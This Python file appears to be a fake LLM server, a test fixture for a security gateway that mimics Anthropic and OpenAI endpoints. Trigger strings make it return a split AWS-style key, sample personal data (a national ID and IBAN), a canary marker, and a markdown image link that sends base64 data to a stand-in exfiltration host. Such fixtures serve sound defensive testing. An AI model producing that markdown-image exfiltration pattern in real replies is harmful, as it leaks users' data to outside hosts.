"""Fake LLM upstream (same surface as `mocks.mock_llm`, CONTRACTS §5.6), served on port 0.

Anthropic `POST /v1/messages` + `/v1/messages/count_tokens`, OpenAI `POST /v1/chat/completions`
(JSON + SSE), `GET /v1/models`. Echo reply "Mock model received: …". Triggers in the last user
message: [[EMIT_SECRET]] [[EMIT_PII]] [[EMIT_MD_EXFIL]] [[EMIT_CANARY]] [[TOOL_USE:n:json]]
[[LONG:n]] [[SLOW:ms]]. Usage is exact: input_tokens = len(all input text)//4,
output_tokens = len(output)//4. Inspection: GET/DELETE /_mock/requests.
"""

from __future__ import annotations

import asyncio
import json
import re
import threading
import time
import uuid
from typing import Any

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, StreamingResponse

CANARY = "AEGIS-CANARY-7f3a91"
PII_TEXT = "Customer Jan Kowalski, PESEL 44051401359, IBAN PL61 1090 1014 0000 0712 1981 2874."
MD_EXFIL = "Here you go. ![x](http://exfil.test/p.png?d=c2VjcmV0LWRhdGE)"


def _text_of(content: Any) -> str:
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        parts = []
        for b in content:
            if isinstance(b, dict):
                if isinstance(b.get("text"), str):
                    parts.append(b["text"])
                elif b.get("type") == "tool_result":
                    parts.append(_text_of(b.get("content")))
            elif isinstance(b, str):
                parts.append(b)
        return "\n".join(parts)
    return ""


class FakeLLMState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.requests: list[dict[str, Any]] = []
        self.secret_parts: list[str] | None = None

    def secret(self) -> list[str]:
        if self.secret_parts is None:
            from tests.lib.macros import gen

            key = gen("aws_access_key_id")
            self.secret_parts = [key[:6], key[6:13], key[13:]]
        return self.secret_parts


def _reply(last_user: str, all_text: str, state: FakeLLMState) -> tuple[list[str], dict | None]:
    """→ (text chunks, optional tool_use {name, input})."""
    tool = None
    m = re.search(r"\[\[TOOL_USE:([\w.\-]+):(\{.*?\})\]\]", last_user, re.S)
    if m:
        try:
            tool = {"name": m.group(1), "input": json.loads(m.group(2))}
        except ValueError:
            tool = {"name": m.group(1), "input": {}}
    if "[[EMIT_SECRET]]" in last_user:
        p = state.secret()
        return ["Here is the key: ", p[0], p[1], p[2], " — keep it safe."], tool
    if "[[EMIT_PII]]" in last_user:
        return [PII_TEXT], tool
    if "[[EMIT_MD_EXFIL]]" in last_user:
        return [MD_EXFIL], tool
    if "[[EMIT_CANARY]]" in last_user:
        return [f"Sure, the hidden marker is {CANARY}."], tool
    m = re.search(r"\[\[LONG:(\d+)\]\]", last_user)
    if m:
        n = min(int(m.group(1)), 200_000)
        return [("lorem ipsum " * (n // 12 + 1))[:n]], tool
    body = last_user if len(last_user) <= 4000 else last_user[:4000]
    return ["Mock model received: ", body], tool


def create_app(state: FakeLLMState | None = None) -> FastAPI:
    st = state or FakeLLMState()
    app = FastAPI(title="aegis-test-fake-llm")
    app.state.fake = st

    def log(path: str, body: dict[str, Any], request: Request, usage: dict[str, int]) -> None:
        with st.lock:
            st.requests.append(
                {
                    "ts": time.time(),
                    "path": path,
                    "model": body.get("model"),
                    "max_tokens": body.get("max_tokens", body.get("max_completion_tokens")),
                    "headers": {k.lower(): v for k, v in request.headers.items()},
                    "body": body,
                    "usage": usage,
                }
            )

    async def maybe_slow(text: str) -> None:
        m = re.search(r"\[\[SLOW:(\d+)\]\]", text)
        if m:
            await asyncio.sleep(min(int(m.group(1)), 10_000) / 1000)

    @app.get("/_mock/health")
    async def health() -> dict[str, str]:
        return {"service": "fake_llm"}

    @app.get("/_mock/requests")
    async def get_requests(limit: int = 100) -> dict[str, Any]:
        with st.lock:
            items = st.requests[-limit:]
        return {"count": len(st.requests), "items": items}

    @app.delete("/_mock/requests")
    async def del_requests() -> dict[str, bool]:
        with st.lock:
            st.requests.clear()
        return {"ok": True}

    @app.post("/_mock/reset")
    async def reset() -> dict[str, bool]:
        with st.lock:
            st.requests.clear()
        return {"ok": True}

    @app.get("/v1/models")
    async def models() -> dict[str, Any]:
        return {
            "object": "list",
            "data": [{"id": m, "object": "model"} for m in ("mock-echo", "mock-sonnet")],
        }

    @app.post("/v1/messages/count_tokens")
    async def count_tokens(request: Request) -> dict[str, int]:
        body = await request.json()
        text = _text_of(body.get("system")) + "".join(
            _text_of(m.get("content")) for m in body.get("messages", [])
        )
        return {"input_tokens": len(text) // 4}

    @app.post("/v1/messages")
    async def messages(request: Request) -> Any:
        body = await request.json()
        msgs = body.get("messages") or []
        all_text = _text_of(body.get("system")) + "".join(_text_of(m.get("content")) for m in msgs)
        last_user = next(
            (_text_of(m.get("content")) for m in reversed(msgs) if m.get("role") == "user"), ""
        )
        await maybe_slow(last_user)
        chunks, tool = _reply(last_user, all_text, st)
        out = "".join(chunks)
        usage = {"input_tokens": len(all_text) // 4, "output_tokens": len(out) // 4}
        log("/v1/messages", body, request, usage)
        mid = "msg_" + uuid.uuid4().hex[:20]
        model = body.get("model", "mock-echo")
        content: list[dict[str, Any]] = [{"type": "text", "text": out}]
        if tool:
            content.append({"type": "tool_use", "id": "toolu_" + uuid.uuid4().hex[:16], **tool})
        if not body.get("stream"):
            return {
                "id": mid,
                "type": "message",
                "role": "assistant",
                "model": model,
                "content": content,
                "stop_reason": "tool_use" if tool else "end_turn",
                "stop_sequence": None,
                "usage": usage,
            }

        def ev(name: str, data: dict[str, Any]) -> str:
            return f"event: {name}\ndata: {json.dumps(data)}\n\n"

        async def gen():
            yield ev(
                "message_start",
                {
                    "type": "message_start",
                    "message": {
                        "id": mid,
                        "type": "message",
                        "role": "assistant",
                        "model": model,
                        "content": [],
                        "stop_reason": None,
                        "stop_sequence": None,
                        "usage": {"input_tokens": usage["input_tokens"], "output_tokens": 1},
                    },
                },
            )
            yield ev(
                "content_block_start",
                {
                    "type": "content_block_start",
                    "index": 0,
                    "content_block": {"type": "text", "text": ""},
                },
            )
            for c in chunks:
                yield ev(
                    "content_block_delta",
                    {
                        "type": "content_block_delta",
                        "index": 0,
                        "delta": {"type": "text_delta", "text": c},
                    },
                )
            yield ev("content_block_stop", {"type": "content_block_stop", "index": 0})
            yield ev(
                "message_delta",
                {
                    "type": "message_delta",
                    "delta": {"stop_reason": "end_turn", "stop_sequence": None},
                    "usage": {"output_tokens": usage["output_tokens"]},
                },
            )
            yield ev("message_stop", {"type": "message_stop"})

        return StreamingResponse(gen(), media_type="text/event-stream")

    @app.post("/v1/chat/completions")
    async def chat(request: Request) -> Any:
        body = await request.json()
        msgs = body.get("messages") or []
        all_text = "".join(_text_of(m.get("content")) for m in msgs)
        last_user = next(
            (_text_of(m.get("content")) for m in reversed(msgs) if m.get("role") == "user"), ""
        )
        await maybe_slow(last_user)
        chunks, _tool = _reply(last_user, all_text, st)
        out = "".join(chunks)
        u = {"prompt_tokens": len(all_text) // 4, "completion_tokens": len(out) // 4}
        u["total_tokens"] = u["prompt_tokens"] + u["completion_tokens"]
        log(
            "/v1/chat/completions",
            body,
            request,
            {"input_tokens": u["prompt_tokens"], "output_tokens": u["completion_tokens"]},
        )
        cid = "chatcmpl-" + uuid.uuid4().hex[:20]
        model = body.get("model", "mock-echo")
        if not body.get("stream"):
            return {
                "id": cid,
                "object": "chat.completion",
                "created": int(time.time()),
                "model": model,
                "choices": [
                    {
                        "index": 0,
                        "message": {"role": "assistant", "content": out},
                        "finish_reason": "stop",
                    }
                ],
                "usage": u,
            }
        include_usage = bool((body.get("stream_options") or {}).get("include_usage"))

        async def gen():
            base = {
                "id": cid,
                "object": "chat.completion.chunk",
                "created": int(time.time()),
                "model": model,
            }
            yield (
                "data: "
                + json.dumps(
                    {
                        **base,
                        "choices": [
                            {"index": 0, "delta": {"role": "assistant"}, "finish_reason": None}
                        ],
                    }
                )
                + "\n\n"
            )
            for c in chunks:
                yield (
                    "data: "
                    + json.dumps(
                        {
                            **base,
                            "choices": [
                                {"index": 0, "delta": {"content": c}, "finish_reason": None}
                            ],
                        }
                    )
                    + "\n\n"
                )
            yield (
                "data: "
                + json.dumps(
                    {**base, "choices": [{"index": 0, "delta": {}, "finish_reason": "stop"}]}
                )
                + "\n\n"
            )
            if include_usage:
                yield "data: " + json.dumps({**base, "choices": [], "usage": u}) + "\n\n"
            yield "data: [DONE]\n\n"

        return StreamingResponse(gen(), media_type="text/event-stream")

    @app.api_route("/{path:path}", methods=["GET", "POST"])
    async def other(path: str) -> JSONResponse:
        return JSONResponse({"error": {"type": "not_found", "message": f"fake llm: /{path}"}}, 404)

    return app


__all__ = ["CANARY", "FakeLLMState", "create_app"]
